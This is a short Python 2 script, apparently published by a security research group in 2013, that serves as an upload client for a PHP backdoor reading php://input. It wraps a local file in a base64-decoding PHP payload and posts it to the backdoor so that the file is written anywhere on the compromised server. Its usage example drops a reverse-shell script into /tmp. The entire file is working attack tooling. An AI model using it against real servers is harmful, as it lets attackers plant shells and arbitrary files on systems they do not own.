#!/usr/bin/python
# Upload.py
# File Upload client for the php://input based backdoor
# Website: insecurety.net
# Author: infodox
# Twatter: @info_dox
# Insecurety Research - 2013
# version: 0.2a
import requests
import sys

if (len(sys.argv) != 4):
    print "Usage: " + sys.argv[0] + " <url of backdoor> <localfile> <remotefile>"
    print "Example: " + sys.argv[0] + " http://localhost/odd.php reverseshell.py /tmp/rsh.py"
    sys.exit(0)

url = sys.argv[1]         
localfile = sys.argv[2]
remotefile = sys.argv[3]

f = open(localfile, "r")
rawfiledata = f.read()
encodedfiledata = rawfiledata.encode('base64')

phppayload = """<?php
$f = fopen("%s", "a");
$x = base64_decode('%s');
fwrite($f, "$x");
fclose($f);
?>""" %(remotefile, encodedfiledata) # I need to add a hashing function sometime for corruption test.

print "[+] Uploading File"
requests.post(url, phppayload) # this is why I love the python requests library
print "[+] Upload should be complete"
